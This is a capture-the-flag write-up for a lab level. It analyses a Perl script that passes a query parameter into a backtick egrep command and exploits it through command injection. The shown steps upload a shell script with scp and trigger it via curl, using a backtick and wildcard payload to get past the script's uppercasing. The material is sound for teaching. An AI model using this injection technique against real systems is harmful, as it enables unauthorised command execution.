# Write up

We now get a `level12.pl` file.
Lets analyse if first :
- `$xx =~ tr/a-z/A-Z/;` : toupper all chars in the x get value string
- `$xx =~ s/\s.*//;` : takes the previous string and delete everything which is after a whitespace char
- ```@output = `egrep "^$xx" /tmp/xd 2>&1`;``` : execute the egrep function using the $xx result to match, has ^ so it's a starting pattern
The script is listening the port 4646, so we can access it with curl.
The y parameter is here irrelevant.

We can use the grave accents to directly execute a command since it's not escaped
The program doesn't print the result, so like the level11 we have to redirect to a file.
But using `getflag>/tmp/lidl` as a payload will not work, since the regex will transform it to `GETFLAG>/TMP/LIDL`.
We have so to make a script that execute this command, and include the shebang to be able to execute it without `sh ` (spaces are escaped)
We create a PAYLOAD.sh file :
```
#!/usr/bin/env sh
getflag > /tmp/lidl
```
We upload and rename it : 
```
scp -P 4242 PAYLOAD.sh level12@192.168.56.101:/tmp/PAYLOAD
```
And we execute it, note that we can't write directly /tmp because it will becomes /TMP, so we use the wild card :
```
curl localhost:4646?x='`/*/PAYLOAD`'
```
And we get our flag :
```
cat /tmp/lidl
```


# Sources

https://perldoc.perl.org/perlop.html